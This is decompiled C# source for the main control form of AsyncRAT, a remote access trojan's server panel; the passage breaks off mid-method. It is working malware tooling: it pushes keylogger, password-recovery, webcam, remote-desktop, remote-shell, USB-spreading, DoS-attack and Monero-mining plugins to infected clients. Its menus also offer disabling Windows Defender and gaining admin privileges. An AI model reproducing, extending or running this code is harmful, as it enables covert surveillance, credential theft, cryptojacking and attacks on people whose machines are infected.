using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server;

public class Form1 : Form
{
	private bool trans;

	public cGeoMain cGeoMain = new cGeoMain();

	private List<AsyncTask> getTasks = new List<AsyncTask>();

	private ListViewColumnSorter lvwColumnSorter;

	private readonly FormDOS formDOS;

	private IContainer components;

	public ListView listView1;

	private ColumnHeader lv_ip;

	private ColumnHeader lv_user;

	private ColumnHeader lv_os;

	private ContextMenuStrip contextMenuClient;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private System.Windows.Forms.Timer ping;

	private System.Windows.Forms.Timer UpdateUI;

	private ToolStripMenuItem sENDFILEToolStripMenuItem;

	public ColumnHeader lv_hwid;

	private ColumnHeader lv_country;

	private ToolStripMenuItem bUILDERToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator2;

	private ColumnHeader lv_version;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	public ListView listView2;

	private ColumnHeader columnHeader1;

	private ColumnHeader columnHeader2;

	private PerformanceCounter performanceCounter1;

	private PerformanceCounter performanceCounter2;

	public ColumnHeader lv_act;

	private ToolStripMenuItem aBOUTToolStripMenuItem;

	private TabPage tabPage3;

	private ContextMenuStrip contextMenuThumbnail;

	private ToolStripMenuItem sTARTToolStripMenuItem;

	private ToolStripMenuItem sTOPToolStripMenuItem;

	public ImageList ThumbnailImageList;

	public ListView listView3;

	public NotifyIcon notifyIcon1;

	private ColumnHeader lv_admin;

	private TabPage tabPage4;

	private ColumnHeader columnHeader4;

	private ColumnHeader columnHeader5;

	private ContextMenuStrip contextMenuTasks;

	private ToolStripMenuItem downloadAndExecuteToolStripMenuItem;

	public ListView listView4;

	private ToolStripMenuItem sENDFILETOMEMORYToolStripMenuItem1;

	private ToolStripMenuItem uPDATEToolStripMenuItem1;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripMenuItem dELETETASKToolStripMenuItem;

	private System.Windows.Forms.Timer TimerTask;

	private ToolStripMenuItem tOMEMORYToolStripMenuItem;

	private ToolStripMenuItem tODISKToolStripMenuItem;

	private ContextMenuStrip contextMenuLogs;

	private ToolStripMenuItem cLEARToolStripMenuItem;

	private ToolStripMenuItem monitoringToolStripMenuItem;

	private ToolStripMenuItem remoteDesktopToolStripMenuItem1;

	private ToolStripMenuItem keyloggerToolStripMenuItem1;

	private ToolStripMenuItem passwordRecoveryToolStripMenuItem1;

	private ToolStripMenuItem fileManagerToolStripMenuItem1;

	private ToolStripMenuItem processManagerToolStripMenuItem1;

	private ToolStripMenuItem reportWindowToolStripMenuItem;

	private ToolStripMenuItem miscellaneousToolStripMenuItem;

	private ToolStripMenuItem botsKillerToolStripMenuItem;

	private ToolStripMenuItem uSBSpreadToolStripMenuItem1;

	private ToolStripMenuItem extraToolStripMenuItem;

	private ToolStripMenuItem visitWebsiteToolStripMenuItem1;

	private ToolStripMenuItem sendMessageBoxToolStripMenuItem1;

	private ToolStripMenuItem chatToolStripMenuItem1;

	private ToolStripMenuItem runToolStripMenuItem1;

	private ToolStripMenuItem stopToolStripMenuItem2;

	private ToolStripMenuItem systemToolStripMenuItem;

	private ToolStripMenuItem clientToolStripMenuItem;

	private ToolStripMenuItem restartToolStripMenuItem2;

	private ToolStripMenuItem closeToolStripMenuItem1;

	private ToolStripMenuItem updateToolStripMenuItem2;

	private ToolStripMenuItem uninstallToolStripMenuItem;

	private ToolStripMenuItem pCToolStripMenuItem;

	private ToolStripMenuItem logoffToolStripMenuItem1;

	private ToolStripMenuItem restartToolStripMenuItem3;

	private ToolStripMenuItem shutdownToolStripMenuItem1;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripSeparator toolStripSeparator3;

	private ToolStripMenuItem showFolderToolStripMenuItem;

	private ToolStripMenuItem seedTorrentToolStripMenuItem1;

	private ToolStripMenuItem remoteShellToolStripMenuItem1;

	private ToolStripMenuItem dOSAttackToolStripMenuItem;

	private ToolStripStatusLabel toolStripStatusLabel2;

	private ToolStripMenuItem executeNETCodeToolStripMenuItem;

	private ColumnHeader lv_av;

	private ToolStripMenuItem pASSWORDRECOVERYToolStripMenuItem;

	private ToolStripMenuItem blankScreenToolStripMenuItem;

	private ToolStripMenuItem getAdminPrivilegesToolStripMenuItem;

	private ToolStripMenuItem disableWindowsDefenderToolStripMenuItem;

	private ToolStripMenuItem webcamToolStripMenuItem;

	private ToolStripMenuItem xMRMinerToolStripMenuItem;

	private ToolStripMenuItem runToolStripMenuItem;

	private ToolStripMenuItem killToolStripMenuItem;

	private ToolStripMenuItem serverToolStripMenuItem;

	private ToolStripSeparator toolStripSeparator5;

	private ToolStripMenuItem blockClientsToolStripMenuItem;

	private ColumnHeader lv_ins;

	public ColumnHeader lv_ping;

	private ToolStripMenuItem minerToolStripMenuItem1;

	private ToolStripMenuItem runToolStripMenuItem2;

	private ToolStripMenuItem stopToolStripMenuItem1;

	private ToolStripMenuItem setWallpaperToolStripMenuItem;

	private ToolStripMenuItem filesSearcherToolStripMenuItem;

	private ColumnHeader lv_group;

	public Form1()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		InitializeComponent();
		SetWindowTheme(listView1.Handle, "explorer", null);
		base.Opacity = 0.0;
		formDOS = new FormDOS
		{
			Name = "DOS",
			Text = "DOS"
		};
		listView1.SmallImageList = cGeoMain.cImageList;
		listView1.LargeImageList = cGeoMain.cImageList;
	}

	private void CheckFiles()
	{
		try
		{
			if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
			{
				MessageBox.Show("Missing " + Path.GetFileName(Application.ExecutablePath) + ".config");
				Environment.Exit(0);
			}
			if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
			{
				MessageBox.Show("Stub not found! unzip files again and make sure your AV is OFF");
			}
			if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
			{
				Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private Clients[] GetSelectedClients()
	{
		List<Clients> clientsList = new List<Clients>();
		Invoke((MethodInvoker)delegate
		{
			lock (Settings.LockListviewClients)
			{
				if (listView1.SelectedItems.Count == 0)
				{
					return;
				}
				foreach (ListViewItem selectedItem in listView1.SelectedItems)
				{
					clientsList.Add((Clients)selectedItem.Tag);
				}
			}
		});
		return clientsList.ToArray();
	}

	private Clients[] GetAllClients()
	{
		List<Clients> clientsList = new List<Clients>();
		Invoke((MethodInvoker)delegate
		{
			lock (Settings.LockListviewClients)
			{
				if (listView1.Items.Count == 0)
				{
					return;
				}
				foreach (ListViewItem item in listView1.Items)
				{
					clientsList.Add((Clients)item.Tag);
				}
			}
		});
		return clientsList.ToArray();
	}

	private async void Connect()
	{
		try
		{
			await Task.Delay(1000);
			string[] array = Server.Properties.Settings.Default.Ports.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Thread thread = new Thread(new Listener().Connect);
					thread.IsBackground = true;
					thread.Start(Convert.ToInt32(text.ToString().Trim()));
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
			Environment.Exit(0);
		}
	}

	private async void Form1_Load(object sender, EventArgs e)
	{
		ListviewDoubleBuffer.Enable(listView1);
		ListviewDoubleBuffer.Enable(listView2);
		ListviewDoubleBuffer.Enable(listView3);
		try
		{
			string[] array = Server.Properties.Settings.Default.txtBlocked.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Settings.Blocked.Add(text);
				}
			}
		}
		catch
		{
		}
		CheckFiles();
		lvwColumnSorter = new ListViewColumnSorter();
		listView1.ListViewItemSorter = lvwColumnSorter;
		Text = Settings.Version ?? "";
		using (FormPorts formPorts = new FormPorts())
		{
			formPorts.ShowDialog();
		}
		await Methods.FadeIn(this, 5);
		trans = true;
		if (Server.Properties.Settings.Default.Notification)
		{
			toolStripStatusLabel2.ForeColor = Color.Green;
		}
		else
		{
			toolStripStatusLabel2.ForeColor = Color.Black;
		}
		new Thread((ThreadStart)delegate
		{
			Connect();
		}).Start();
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
		if (trans)
		{
			base.Opacity = 1.0;
		}
	}

	private void Form1_Deactivate(object sender, EventArgs e)
	{
		base.Opacity = 0.95;
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		notifyIcon1.Dispose();
		Environment.Exit(0);
	}

	private void listView1_KeyDown(object sender, KeyEventArgs e)
	{
		if (listView1.Items.Count <= 0 || e.Modifiers != Keys.Control || e.KeyCode != Keys.A)
		{
			return;
		}
		foreach (ListViewItem item in listView1.Items)
		{
			item.Selected = true;
		}
	}

	private void listView1_MouseMove(object sender, MouseEventArgs e)
	{
		if (listView1.Items.Count > 1)
		{
			ListViewHitTestInfo listViewHitTestInfo = listView1.HitTest(e.Location);
			if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
			{
				listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
			}
		}
	}

	private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		if (e.Column == lvwColumnSorter.SortColumn)
		{
			if (lvwColumnSorter.Order == SortOrder.Ascending)
			{
				lvwColumnSorter.Order = SortOrder.Descending;
			}
			else
			{
				lvwColumnSorter.Order = SortOrder.Ascending;
			}
		}
		else
		{
			lvwColumnSorter.SortColumn = e.Column;
			lvwColumnSorter.Order = SortOrder.Ascending;
		}
		listView1.Sort();
	}

	private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
	{
		if (Server.Properties.Settings.Default.Notification)
		{
			Server.Properties.Settings.Default.Notification = false;
			toolStripStatusLabel2.ForeColor = Color.Black;
		}
		else
		{
			Server.Properties.Settings.Default.Notification = true;
			toolStripStatusLabel2.ForeColor = Color.Green;
		}
		Server.Properties.Settings.Default.Save();
	}

	private void ping_Tick(object sender, EventArgs e)
	{
		if (listView1.Items.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "Ping";
			msgPack.ForcePathObject("Message").AsString = "This is a ping!";
			Clients[] allClients = GetAllClients();
			for (int i = 0; i < allClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(allClients[i].Send, msgPack.Encode2Bytes());
			}
			GC.Collect();
		}
	}

	private void UpdateUI_Tick(object sender, EventArgs e)
	{
		Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
		lock (Settings.LockListviewClients)
		{
			toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
		}
	}

	private void TOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			formSendFileToMemory.ShowDialog();
			if (formSendFileToMemory.IsOK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
				if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			formSendFileToMemory.Close();
			formSendFileToMemory.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private async void TODISKToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Multiselect = true;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack packet = new MsgPack();
			packet.ForcePathObject("Packet").AsString = "sendFile";
			packet.ForcePathObject("Update").AsString = "false";
			MsgPack msgpack = new MsgPack();
			msgpack.ForcePathObject("Packet").AsString = "plugin";
			msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients client in selectedClients)
			{
				client.LV.ForeColor = Color.Red;
				string[] fileNames = openFileDialog.FileNames;
				foreach (string file in fileNames)
				{
					await Task.Run(delegate
					{
						packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
						packet.ForcePathObject("Extension").AsString = Path.GetExtension(file);
						msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
					});
					ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteDesktop.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
				{
					FormRemoteDesktop formRemoteDesktop = new FormRemoteDesktop();
					formRemoteDesktop.Name = "RemoteDesktop:" + clients.ID;
					formRemoteDesktop.F = this;
					formRemoteDesktop.Text = "RemoteDesktop:" + clients.ID;
					formRemoteDesktop.ParentClient = clients;
					formRemoteDesktop.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop");
					formRemoteDesktop.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\LimeLogger.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
				{
					FormKeylogger formKeylogger = new FormKeylogger();
					formKeylogger.Name = "keyLogger:" + clients.ID;
					formKeylogger.Text = "keyLogger:" + clients.ID;
					formKeylogger.F = this;
					formKeylogger.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
				{
					FormFileManager formFileManager = new FormFileManager();
					formFileManager.Name = "fileManager:" + clients.ID;
					formFileManager.Text = "fileManager:" + clients.ID;
					formFileManager.F = this;
					formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID);
					formFileManager.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void PasswordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Sending Password Recovery..", Color.Black);
			tabControl1.SelectedIndex = 1;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ProcessManager.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
				{
					FormProcessManager formProcessManager = new FormProcessManager();
					formProcessManager.Name = "processManager:" + clients.ID;
					formProcessManager.Text = "processManager:" + clients.ID;
					formProcessManager.F = this;
					formProcessManager.ParentClient = clients;
					formProcessManager.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RunToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("SEND A NOTIFICATION WHEN CLIENT OPEN A SPECIFIC WINDOW", "TITLE", "YouTube, Photoshop, Steam");
			if (!string.IsNullOrEmpty(text))
			{
				lock (Settings.LockReportWindowClients)
				{
					Settings.ReportWindowClients.Clear();
					Settings.ReportWindowClients = new List<Clients>();
				}
				Settings.ReportWindow = true;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "run";
				msgPack.ForcePathObject("Title").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			Settings.ReportWindow = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "reportWindow";
			msgPack.ForcePathObject("Option").AsString = "stop";
			lock (Settings.LockReportWindowClients)
			{
				foreach (Clients reportWindowClient in Settings.ReportWindowClients)
				{
					ThreadPool.QueueUserWorkItem(reportWindowClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void WebcamToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "plugin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RemoteCamera.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
				{
					FormWebcam formWebcam = new FormWebcam();
					formWebcam.Name = "Webcam:" + clients.ID;
					formWebcam.F = this;
					formWebcam.Text = "Webcam:" + clients.ID;
					formWebcam.ParentClient = clients;
					formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera");
					formWebcam.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "botKiller";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Sending Botkiller..", Color.Black);
			tabControl1.SelectedIndex = 1;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void USBSpreadToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "limeUSB";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SeedTorrentToolStripMenuItem1_Click_1(object sender, EventArgs e)
	{
		using FormTorrent formTorrent = new FormTorrent();
		formTorrent.ShowDialog();
	}

	private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "shell";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
				{
					FormShell formShell = new FormShell();
					formShell.Name = "shell:" + clients.ID;
					formShell.Text = "shell:" + clients.ID;
					formShell.F = this;
					formShell.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DOSAttackToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		try
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "dosAdd";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
				formDOS.Show();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count > 0)
		{
			using (FormDotNetEditor formDotNetEditor = new FormDotNetEditor())
			{
				formDotNetEditor.ShowDialog();
			}
		}
	}

	private void RunToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			using FormMiner formMiner = new FormMiner();
			if (formMiner.ShowDialog() == DialogResult.OK)
			{
				if (!File.Exists("Plugins\\xmrig.bin"))
				{
					File.WriteAllBytes("Plugins\\xmrig.bin", Resources.xmrig);
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "xmr";
				msgPack.ForcePathObject("Command").AsString = "run";
				XmrSettings.Pool = formMiner.txtPool.Text;
				msgPack.ForcePathObject("Pool").AsString = formMiner.txtPool.Text;
				XmrSettings.Wallet = formMiner.txtWallet.Text;
				msgPack.ForcePathObject("Wallet").AsString = formMiner.txtWallet.Text;
				XmrSettings.Pass = formMiner.txtPass.Text;
				msgPack.ForcePathObject("Pass").AsString = formMiner.txtPool.Text;
				XmrSettings.InjectTo = formMiner.comboInjection.Text;
				msgPack.ForcePathObject("InjectTo").AsString = formMiner.comboInjection.Text;
				XmrSettings.Hash = GetHash.GetChecksum("Plugins\\xmrig.bin");
				msgPack.ForcePathObject("Hash").AsString = XmrSettings.Hash;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void KillToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "xmr";
				msgPack.ForcePathObject("Command").AsString = "stop";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void filesSearcherToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormFileSearcher formFileSearcher = new FormFileSearcher();
		if (formFileSearcher.ShowDialog() == DialogResult.OK && listView1.SelectedItems.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileSearcher";
			msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000 * 1000;
			msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients obj in selectedClients)
			{
				obj.LV.ForeColor = Color.Red;
				ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
			}
		}
	}

	private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("VISIT WEBSITE", "URL", "https://www.google.com");
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "visitURL";
				msgPack.ForcePathObject("URL").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Message", "Message", "Hello World!");
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "sendMessage";
				msgPack.ForcePathObject("Message").AsString = text;
				MsgPack msgPack2 = new MsgPack();
